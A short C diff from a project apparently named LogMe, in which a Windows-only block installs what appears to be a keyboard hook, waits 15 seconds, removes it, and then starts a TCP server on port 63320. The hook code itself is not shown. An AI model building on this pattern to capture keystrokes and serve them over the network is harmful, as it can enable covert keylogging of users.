@@ -55,7 +55,18 @@ int main()
     delete_vlist(list, &list);
 
 #ifdef LOGME_WINDOWS
-    kbhook_run_success();
+    int hook_success;
+    HANDLE hook,sharedobj;
+    InstallHook(&hook_success, &hook, &sharedobj);
+    if (hook_success) {
+        LogMe.i("HOOK INSTALL SUCCESS!");
+        Sleep(15000);
+        UninstallHook(hook, &hook, sharedobj, &sharedobj);
+        LogMe.w("HOOK UNINSTALLED");
+    }
+    else {
+        LogMe.e("HOOK INSTALL FAIL!");
+    }
     tcp_server_run(63320, 1);
 #endif // LOGME_WINDOWS
 
